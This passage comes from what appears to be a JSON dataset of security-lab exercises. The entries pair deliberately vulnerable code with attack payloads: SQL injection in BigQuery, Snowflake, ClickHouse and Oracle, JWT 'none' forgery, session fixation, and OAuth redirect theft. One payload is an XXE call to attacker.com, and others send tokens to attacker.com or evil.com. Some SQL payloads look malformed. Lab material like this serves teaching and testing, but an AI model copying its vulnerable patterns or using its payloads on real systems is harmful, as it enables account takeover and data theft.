                            "Solution Steps": [
                              "Identify remote function calls",
                              "Craft malicious HTTP responses",
                              "Bypass response validation",
                              "Execute arbitrary SQL",
                              "Access cross-project datasets"
                            ],
                            "Vulnerability name": "BigQuery Remote Response Injection",
                            "srcCode": "CREATE FUNCTION remote_process(arg STRING) RETURNS STRING REMOTE WITH CONNECTION remote_conn OPTIONS (endpoint = 'https://api.example.com/process?param=' || arg)",
                            "payloads": [
                              "1' UNION SELECT dataset_id FROM region-us.INFORMATION_SCHEMA.SCHEMATA--",
                              "legit' FROM (SELECT * FROM EXTERNAL_QUERY('connection', 'SELECT 1'))--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Snowflake External Stage COPY Options",
                            "Lab Description": "A Snowflake pipeline uses COPY INTO commands with dynamic stage options. The options are concatenated directly into load/unload operations, allowing injection during file operations.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify COPY INTO commands",
                              "Inject through format options",
                              "Bypass stage validation",
                              "Modify loaded data",
                              "Exfiltrate via file operations"
                            ],
                            "Vulnerability name": "Snowflake COPY Option Injection",
                            "srcCode": "COPY INTO table FROM @stage FILE_FORMAT = (TYPE = CSV \" + userOptions + \")",
                            "payloads": [
                              "FIELD_DELIMITER=',') FROM (SELECT * FROM information_schema.tables) x--",
                              "SKIP_HEADER=1) RETURNING *--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Databricks Unity Catalog Table Comments",
                            "Lab Description": "A Databricks environment sets table comments with dynamic values. The comment text is concatenated directly into catalog metadata queries, allowing injection during table operations.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify table comment updates",
                              "Inject through comment text",
                              "Trigger catalog queries",
                              "Bypass comment validation",
                              "Access metastore data"
                            ],
                            "Vulnerability name": "Databricks Comment Injection",
                            "srcCode": "COMMENT ON TABLE my_table IS '\" + userComment + \"'",
                            "payloads": [
                              "' FROM (SELECT * FROM system.information_schema.tables)--",
                              "test'); SELECT * FROM hive_metastore.default.secrets--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Trino Function Authorization Checks",
                            "Lab Description": "A Trino cluster implements function security with dynamic authorization checks. The check expressions are concatenated directly into function execution, allowing injection during privilege verification.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify function authorization points",
                              "Inject through check expressions",
                              "Bypass privilege checks",
                              "Execute unauthorized functions",
                              "Access system functions"
                            ],
                            "Vulnerability name": "Trino Function Authorization Injection",
                            "srcCode": "CREATE FUNCTION my_func RETURNS STRING WITH (\" + userChecks + \") AS 'SELECT 1'",
                            "payloads": [
                              "security_definer = true) FROM (SELECT * FROM system.metadata.catalogs)--",
                              "owner = current_user) RETURNING *--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Presto Resource Group Selector Conditions",
                            "Lab Description": "A Presto cluster configures resource groups with dynamic selector conditions. The conditions are concatenated directly into query routing logic, allowing injection during scheduling.",
                            "Difficulty Level": "Medium",
                            "Solution Steps": [
                              "Identify resource group configuration",
                              "Inject through selector conditions",
                              "Bypass condition validation",
                              "Modify query routing",
                              "Access privileged resources"
                            ],
                            "Vulnerability name": "Presto Resource Selector Injection",
                            "srcCode": "CREATE RESOURCE GROUP my_group WITH (soft_memory_limit='80%', \" + userSelectors + \")",
                            "payloads": [
                              "selector='user=admin' FROM (SELECT * FROM system.runtime.queries)--",
                              "query_type='SELECT') RETURNING *--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in ClickHouse Dictionary Source Credentials",
                            "Lab Description": "A ClickHouse cluster configures dictionary sources with dynamic credentials. The credential strings are concatenated directly into dictionary definitions, allowing injection during data loading.",
                            "Difficulty Level": "Critical",
                            "Solution Steps": [
                              "Identify dictionary credential settings",
                              "Inject through credential parameters",
                              "Trigger dictionary reload",
                              "Bypass credential validation",
                              "Access external systems"
                            ],
                            "Vulnerability name": "ClickHouse Credential Injection",
                            "srcCode": "CREATE DICTIONARY my_dict (SOURCE(MYSQL(USER '\" + user + \"' PASSWORD '\" + pass + \"')))",
                            "payloads": [
                              "root', PASSWORD 'hack')) FROM system.dictionaries--",
                              "legit_user', PASSWORD 'secret'))) COPY TABLE dict_data TO '/tmp/leak'--"
                            ]
                          },
                          {
                            "Lab scenario": "SQL Injection in Druid Supervisor Spec Templates",
                            "Lab Description": "A Druid cluster creates ingestion supervisors with dynamic spec templates. The template values are concatenated directly into supervisor JSON, allowing injection during data ingestion.",
                            "Difficulty Level": "High",
                            "Solution Steps": [
                              "Identify supervisor creation",
                              "Inject through spec parameters",
                              "Bypass JSON validation",
                              "Modify ingestion behavior",
                              "Access system metadata"
                            ],
                            "Vulnerability name": "Druid Supervisor Spec Injection",
                            "srcCode": "{\"type\":\"index_parallel\",\"spec\":{\"\" + specKey + \"\":\"\" + specValue + \"\"}}",
                            "payloads": [
                              "\"ioConfig\":{\"type\":\"index_parallel\"},\"malicious\":\"' UNION SELECT * FROM sys.servers--\"",
                              "\"dataSchema\":{\"dataSource\":\"test\"}}; SELECT * FROM sys.segments--"
                            ]
                          },

                          {
                                "Lab scenario": "SQL Injection in PostgreSQL SECURITY LABEL",
                                "Lab Description": "A security labeling system uses PostgreSQL's SECURITY LABEL command with dynamic label values. The label text is concatenated directly into security policy enforcement, allowing injection during label assignment to database objects.",
                                "Difficulty Level": "High",
                                "Solution Steps": [
                                  "Identify SECURITY LABEL usage",
                                  "Inject through label value parameter",
                                  "Bypass label format validation",
                                  "Modify row-level security policies",
                                  "Escalate privileges via policy manipulation"
                                ],
                                "Vulnerability name": "PostgreSQL Security Label Injection",
                                "srcCode": "SECURITY LABEL FOR 'custom_provider' ON TABLE sensitive_data IS '\\'' + userLabel + '\\''",
                                "payloads": [
                                  "' || (SELECT current_setting('is_superuser')))--",
                                  "confidential' FROM (SELECT * FROM pg_policies) x--"
                                ]
                              },
                              {
                                "Lab scenario": "SQL Injection in MySQL X Plugin Document IDs",
                                "Lab Description": "A document store using MySQL X Protocol processes CRUD operations with dynamic document _id fields. The document identifiers are concatenated directly into NoSQL-style queries that translate to SQL, allowing injection through crafted IDs.",
                                "Difficulty Level": "Medium",
                                "Solution Steps": [
                                  "Identify X DevAPI CRUD operations",
                                  "Inject through document _id parameter",
                                  "Bypass JSON document validation",
                                  "Execute arbitrary SQL through ID values",
                                  "Exfiltrate data via error messages"
                                ],
                                "Vulnerability name": "MySQL X Plugin ID Injection",
                                "srcCode": "db.collection.find('_id = \"\\'' + userId + '\\\"')",
                                "payloads": [
                                  "\"' OR 1=1--\"",
                                  "\"') FROM (SELECT * FROM mysql.user) x--\""
                                ]
                              },
                              {
                                "Lab scenario": "SQL Injection in SQL Server Graph MATCH Shortest Path",
                                "Lab Description": "A graph analytics application uses SHORTEST_PATH with dynamic node filters. The filter expressions are concatenated directly into graph traversal queries, allowing injection during path calculation.",
                                "Difficulty Level": "Hard",
                                "Solution Steps": [
                                  "Identify SHORTEST_PATH usage",
                                  "Inject through node filter parameters",
                                  "Bypass graph syntax validation",
                                  "Access unauthorized graph nodes",
                                  "Exfiltrate data via path properties"
                                ],
                                "Vulnerability name": "SQL Server Graph Path Injection",
                                "srcCode": "MATCH SHORTEST_PATH((n)-[*]->(m) WHERE n.name = '\\'' + userFilter + '\\'')",
                                "payloads": [
                                  "' OR EXISTS(SELECT * FROM sys.objects)--",
                                  "admin' AND 1=CONVERT(INT,(SELECT @@version)))--"
                                ]
                              },
                              {
                                "Lab scenario": "SQL Injection in Oracle Text HIGHLIGHT Offset Parameters",
                                "Lab Description": "A document search application uses CTX_DOC.HIGHLIGHT with dynamic offset parameters. The numeric offsets are concatenated directly into highlight generation, allowing injection through arithmetic expressions.",
                                "Difficulty Level": "Medium",
                                "Solution Steps": [
                                  "Identify CTX_DOC.HIGHLIGHT calls",
                                  "Inject through offset parameters",
                                  "Bypass numeric validation",
                                  "Access document store tables",
                                  "Manipulate highlighted output"
                                ],
                                "Vulnerability name": "Oracle Highlight Offset Injection",
                                "srcCode": "CTX_DOC.HIGHLIGHT('index_name', '\\'' + docId + '\\'', '\\'' + userOffsets + '\\'')",
                                "payloads": [
                                  "1,1) FROM (SELECT * FROM ctx_user_indexes) x--",
                                  "0+TO_NUMBER(EXTRACTVALUE(XMLTYPE('<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/\"> %remote;]>'),'/l'))--"
                                ]
                              },
                              {
                                "Lab scenario": "SQL Injection in Snowflake Time Travel OFFSET",
                                "Lab Description": "A data recovery tool uses time travel queries with dynamic OFFSET values. The time offset strings are concatenated directly into AT|BEFORE clauses, allowing injection during historical data retrieval.",
                                "Difficulty Level": "High",
                                "Solution Steps": [
                                  "Identify time travel queries",
                                  "Inject through offset parameters",
                                  "Bypass timestamp validation",
                                  "Access unauthorized historical versions",
                                  "Recover deleted records via offset manipulation"
                                ],
                                "Vulnerability name": "Snowflake Time Offset Injection",
                                "srcCode": "SELECT * FROM table AT(OFFSET => '\\'' + userOffset + '\\''::VARIANT)",
                                "payloads": [
                                  "'-60 MINUTE'::VARIANT) FROM (SELECT * FROM information_schema.tables)--",
                                  "INTERVAL '1 HOUR'))) RETURNING *--"
                                ]
                          },
                          
  {
    "Lab scenario": "JWT token tampering vulnerability in session management",
    "Lab Description": "The application uses JWTs for user sessions, but incorrectly trusts the `alg` header from the token instead of enforcing HS256. This allows an attacker to forge tokens by setting the algorithm to 'none'. The application fails to verify the token signature properly. To solve: forge an administrator JWT and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or Postman to log in and capture the issued JWT from the Authorization header.",
      "Decode the JWT using jwt.io or jwt-tool to view its header and payload.",
      "Modify the header to { \"alg\": \"none\" } and set payload to { \"username\": \"admin\" }",
      "Remove the signature part of the JWT and resend the forged token via Authorization: Bearer [token]",
      "Visit /admin/dashboard to confirm admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.payload.username === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000, () => console.log('JWT Lab running'));",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer [header].[payload]."
    ]
  },
  {
    "Lab scenario": "OAuth redirection hijack in authentication flow",
    "Lab Description": "The application uses OAuth for login via a third-party provider, but fails to validate the redirect_uri parameter. This allows attackers to hijack the token and redirect it to their own malicious domain. To solve: steal the victim’s token by injecting a malicious redirect_uri and access their data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate an OAuth login and intercept the authorization request.",
      "Modify the redirect_uri parameter to point to your controlled domain (e.g. https://attacker.com/oauth-capture).",
      "Send the modified URL to the victim and wait for them to authorize it.",
      "Capture the token in your controlled domain.",
      "Use the token in the Authorization header to access /user/profile endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const token = 'victimToken123'; res.redirect(`${redirect}?access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'victimToken123') { res.send('Sensitive profile data for victim'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Lab running'));",
    "payloads": [
      "https://vulnerable.com/auth?redirect_uri=https://evil.com/oauth-capture",
      "Authorization: Bearer victimToken123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application sets a session ID cookie before authentication and does not regenerate it upon successful login. An attacker can set a known session ID for a victim before they log in and later use that session ID to access the victim's account. To solve: log in as the victim using a fixed session ID to hijack the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a GET request to the login page and observe the Set-Cookie: sessionId=abc123",
      "Send the same cookie to the victim and trick them into logging in while using sessionId=abc123",
      "Once the victim logs in, their session is tied to sessionId=abc123",
      "Reuse that session cookie in your browser or Burp",
      "Access /dashboard to confirm you are logged in as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); const sessions = {}; const users = [{ username: 'victim', password: 'pass123' }]; app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.cookie('sessionId', 'abc123'); res.send('<form method=\"POST\">Username: <input name=\"username\"/><br>Password: <input name=\"password\"/><br><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions['abc123'] = username; res.redirect('/dashboard'); } else { res.send('Login failed'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionId=abc123",
      "POST /login with username=victim&password=pass123 (from victim’s browser with injected sessionId=abc123)",
      "GET /dashboard with Cookie: sessionId=abc123"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for user authentication. However, it fails to enforce algorithm validation, allowing tokens signed with 'none' to bypass verification. The application trusts the 'alg' value in the header and processes the token without signature validation. To solve: Craft a tampered token granting 'admin' access and use it to access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a JWT token from an authenticated request using Burp Suite.",
      "Decode the JWT using jwt.io and observe the algorithm set as 'HS256'.",
      "Replace the 'alg' header with 'none' and modify the payload to { \"username\": \"admin\" }.",
      "Remove the signature and reconstruct the token as header.payload (omit the third part).",
      "Send a GET request to /admin with the forged JWT in the Authorization header to gain access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'secretkey123'; app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const payload = jwt.verify(token, secret, { algorithms: [decoded.header.alg] }); if (payload.username === 'admin') res.send('Welcome Admin!'); else res.status(403).send('Access Denied'); }); app.listen(4000, () => console.log('JWT None Algo Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "The application accepts user-provided session IDs via cookies before login, without regenerating them after successful authentication. This allows attackers to set a known session ID before the victim logs in. To solve: Fixate a session, wait for the victim to authenticate, and hijack their session to access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept a pre-login request and inject a custom session cookie like sessionid=attacker123.",
      "Send the link with embedded cookie to the victim (assume social engineering succeeded).",
      "Wait until the victim logs in and the same session ID becomes authenticated.",
      "Reuse the sessionid=attacker123 from your browser to access the victim's /profile page.",
      "Verify successful session takeover by checking personal details on the profile page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'vulnsecret', resave: false, saveUninitialized: true })); app.use(require('body-parser').urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); req.session.username = user.username; res.send('Logged in successfully'); }); app.get('/profile', (req, res) => { if (!req.session.username) return res.status(403).send('Not authenticated'); res.send(`Welcome ${req.session.username}, this is your profile.`); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "Set-Cookie: sessionid=attacker123; Path=/; HttpOnly"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfigured with open redirect on callback",
    "Lab Description": "The application uses OAuth 2.0 with the implicit grant type. The redirection URI is not strictly validated, allowing an attacker to intercept the access token via a malicious redirect URL. To solve: Craft an authorization URL with a redirect_uri pointing to your attacker-controlled site and steal the victim's token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to inspect the OAuth flow and discover the redirect_uri parameter is not validated.",
      "Craft an authorization URL using the victim’s client_id and set redirect_uri to https://attacker.com/capture.",
      "Send the link to the victim. Once clicked, the access_token is included in the fragment of the redirected URL.",
      "On https://attacker.com/capture, use JavaScript to parse the token and send it to your attacker server.",
      "Replay the stolen token in the Authorization header to access /account as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const clients = [{ client_id: 'trusted-client', redirect_uri: 'https://victim.com/callback' }]; const tokens = {}; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (!clients.find(c => c.client_id === client_id)) return res.status(400).send('Invalid client');  let token = 'access-token-xyz'; tokens[client_id] = token; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(tokens).includes(token)) res.send('Welcome to your account'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running'));",
    "payloads": [
      "https://vulnerable-oauth.com/authorize?response_type=token&client_id=trusted-client&redirect_uri=https://attacker.com/capture",
      "https://attacker.com/capture#access_token=access-token-xyz"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie-based Authentication",
    "Lab Description": "The application uses a session cookie to manage authenticated state. However, it accepts arbitrary session IDs from unauthenticated users and does not regenerate the session ID after login, enabling session fixation. The application fails to invalidate old sessions. To solve: Hijack Carlos's session by fixing a session ID before login and accessing his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request to GET /login and manually set a crafted session cookie like sessionid=attacker123",
      "Forward the request and log in using Carlos's credentials while keeping the session ID fixed",
      "Confirm that the server maintains the same sessionid after login (check in Burp Repeater)",
      "Use Postman or your browser to access /my-account using the sessionid=attacker123 as a cookie",
      "Verify access to Carlos's account without knowing his credentials"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('sessionid', sid); res.send(`Welcome, ${username}`); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionid]; if (!username) return res.status(403).send('Not logged in'); res.send(`Account page of ${username}`); }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "POST /login with sessionid=attacker123 and carlos's credentials",
      "GET /my-account with sessionid=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in Bearer Token Authentication",
    "Lab Description": "The application uses JWTs to manage user sessions, but fails to verify the signing algorithm correctly. By modifying the JWT to use 'alg':'none' and removing the signature, an attacker can spoof any user's token. To solve: Tamper with a JWT to impersonate Carlos and access the protected dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or Postman to intercept an authenticated request and copy the JWT",
      "Decode the JWT using jwt.io or CyberChef, and change the payload to {\"username\": \"carlos\"} and header to {\"alg\":\"none\"}",
      "Remove the signature portion of the JWT (leave two parts only)",
      "Use the modified token in the Authorization: Bearer header to access /dashboard",
      "Verify Carlos's dashboard loads, confirming privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'secret123'; app.use(require('body-parser').json()); app.get('/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username) return res.send(`Welcome, ${payload.username}`); return res.status(403).send('Invalid token'); } try { const user = jwt.verify(token, secret); res.send(`Welcome, ${user.username}`); } catch (e) { res.status(403).send('Invalid JWT'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <tampered JWT>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Authorization Flow",
    "Lab Description": "The app uses OAuth 2.0 to authenticate users via a third-party provider, but it exposes the authorization code in a GET request and does not validate the redirect URI. This allows an attacker to intercept a code meant for another user and exchange it for an access token. To solve: Hijack Carlos's OAuth code and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy traffic and monitor the GET /oauth-callback?code=<code> request during login",
      "Trigger Carlos to log in via phishing or clickjacking and capture his code in a malicious redirect URI",
      "Use Postman to craft a POST request to /oauth/token with the stolen code",
      "Use the received access_token to make a GET request to /user-info",
      "Verify access to Carlos's data by confirming his email or username"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth-provider.com/token', { code, client_id: 'xyz', client_secret: 'abc' }); const token = tokenRes.data.access_token; const userRes = await axios.get('https://oauth-provider.com/user', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Logged in as ${userRes.data.username}`); }); app.listen(4000);",
    "payloads": [
      "GET /oauth-callback?code=intercepted-code",
      "POST /oauth/token with intercepted code",
      "GET /user-info with Authorization: Bearer <stolen-token>"
    ]
  },
  {
    "Lab scenario": "JWT Signature Bypass using 'none' algorithm in Authorization Header",
    "Lab Description": "This lab's authentication system uses JWTs to authorize users. The application does not properly validate the JWT algorithm, allowing attackers to set the alg to 'none'. This lets attackers forge tokens without a signature. To solve the lab, craft a JWT to impersonate the user Carlos and access his account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept JWT using Burp Suite's Proxy during login request.",
      "Copy the original token and decode it using jwt.io or Burp Decoder.",
      "Change the 'alg' field in header to 'none' and the 'sub' claim to 'carlos'. Remove the signature section.",
      "Send the tampered token using Postman or Burp Repeater in the Authorization: Bearer header.",
      "Access /my-account with the forged token to verify successful bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const users = ['wiener', 'carlos']; app.post('/login', (req, res) => { const { username } = req.body; if (!users.includes(username)) return res.status(403).send('Invalid user'); const token = jwt.sign({ sub: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret'); res.send(`Account page for ${decoded.sub}`); } catch (err) { res.status(401).send('Unauthorized'); } }); app.listen(3000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "{\"alg\":\"none\"}.{\"sub\":\"carlos\"}."
    ]
  },
  {
    "Lab scenario": "Session Fixation Vulnerability in Login Flow",
    "Lab Description": "The application sets the session ID before authentication, allowing attackers to fix a victim's session ID. If a victim logs in using the fixed session, the attacker can hijack the session. To solve the lab, fix the session ID for Carlos, wait for login, and hijack his session to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a GET request to /login to obtain a pre-authentication session cookie using Burp or Postman.",
      "Use social engineering or simulate victim login with this fixed session ID (e.g., via stored XSS or link delivery).",
      "After victim logs in, replay the session ID in your own browser using Burp's Cookie editor.",
      "Visit /my-account with the hijacked session.",
      "Verify access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'pass123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { sid } = req.cookies; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid] = username; res.send(`Welcome ${username}`); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { res.send(`Account: ${user}`); } else { res.status(401).send('Not authenticated'); } }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login -> Set-Cookie: sid=attackersession",
      "Cookie: sid=attackersession after victim logs in",
      "Hijack fixed session cookie post-authentication"
    ]
  },
  {
    "Lab scenario": "OAuth Redirect URI Manipulation Leads to Access Token Theft",
    "Lab Description": "The application uses OAuth 2.0 for login, but does not validate the redirect_uri parameter strictly. An attacker can manipulate this to redirect the OAuth token to a malicious domain. To solve: exploit this flaw to steal Carlos's access token and access his account via the API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth flow and vulnerable endpoint using OWASP ZAP or Burp Suite.",
      "Craft a malicious redirect_uri pointing to your attacker server (e.g., ngrok.io).",
      "Send a phishing link with the malicious redirect_uri to the victim (Carlos).",
      "Capture the access_token in your attacker server logs.",
      "Use Postman or curl with the stolen token to call /api/userinfo and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'access_token_for_carlos'; const uri = `${redirect_uri}?access_token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === 'access_token_for_carlos') res.send('Carlos Account Accessed'); else res.status(401).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Redirect URI Lab running'));",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback?access_token=access_token_for_carlos",
      "GET /my-account?access_token=access_token_for_carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL Parameter Injection in Login Endpoint",
    "Lab Description": "The login mechanism allows user-supplied session IDs to be set via a query parameter before authentication. The application binds the provided session ID to the authenticated session without validation. To solve: Hijack Carlos's session by forcing him to use a fixed session ID and then authenticate using it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login GET request before authenticating. Note that a 'sessionId' parameter can be injected via URL.",
      "2. Log in with your own account using a custom sessionId (e.g., sessionId=abc123). Observe that the server sets this ID as the authenticated session.",
      "3. Host a malicious link (e.g., http://vulnerable.site/login?sessionId=abc123) and trick Carlos into clicking it via social engineering or phishing.",
      "4. Once Carlos uses the link, the session will be fixed. Log in yourself using Carlos’s credentials and confirm the session is shared.",
      "5. Visit /my-account while authenticated to verify you have hijacked Carlos’s session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.use((req, res, next) => { let sid = req.query.sessionId || req.cookies.sessionId; if (!sid) { sid = Math.random().toString(36).substring(2); } res.cookie('sessionId', sid); req.session = sessions[sid] = sessions[sid] || {}; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send(`Welcome, ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account details for ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "http://vulnerable.site/login?sessionId=abc123",
      "POST /login with sessionId=abc123 in cookie",
      "Set-Cookie: sessionId=abc123"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass using 'none' Algorithm in Token Verification Logic",
    "Lab Description": "The server uses JWTs for authentication but improperly accepts tokens signed with the 'none' algorithm, trusting unsigned tokens. To solve: Forge a valid JWT for Carlos with 'none' as algorithm, gain access to his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to log in and capture the Authorization: Bearer <token> header from your response.",
      "2. Decode the JWT at jwt.io and observe the 'alg' field (likely HS256). Change it to 'none' and set payload to {\"username\":\"carlos\"}.",
      "3. Remove the signature part entirely (only header and payload remain, separated by two dots).",
      "4. Replace your Authorization header with the tampered JWT.",
      "5. Visit the /my-account endpoint while authenticated using the fake token to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'letmein') { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome to ${decoded.username}'s account`); } catch (e) { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running...'));",
    "payloads": [
